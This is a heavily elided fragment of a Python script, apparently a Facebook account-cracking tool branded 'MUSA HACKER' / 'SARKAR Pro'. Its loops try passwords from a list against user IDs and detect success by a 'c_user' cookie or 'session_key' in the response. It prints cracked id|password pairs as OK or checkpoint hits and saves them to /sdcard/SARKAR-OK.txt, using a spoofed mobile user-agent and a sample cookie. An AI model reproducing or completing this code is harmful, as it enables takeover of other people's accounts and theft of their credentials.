...
----------------------------------------------
 Author    : MUSA HACKER
 Github    : MUSA HACKER
 Facebook  : MUSA HACKER
 Tool Name : DADA MUSA MALGHA LARA
 Type type : FREE
 Version   : 1.9.8
----------------------------------------------
 SARKAR Pro version 1.9.8
 TEAM OFF :  DADAX  MUSAA MALGHA LARA
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SARKAR:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MUSA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
    ...
    # 'cookie': 'datr=BcK9Y6SsYrJBe71PMJaafaPu; sb=BcK9YzF1MxIPnj_BkDH7pfyj; m_pixel_ratio=2; wd=360x664; fr=0NgmAmQgHOqDRI0lS..BjvcIF.wY.AAA.0.0.BjvcIV.AWU8il_WK8o',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MUSA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SARKAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [MUSA-OK] '+uid+' | '+pas+'\033[1;97m')
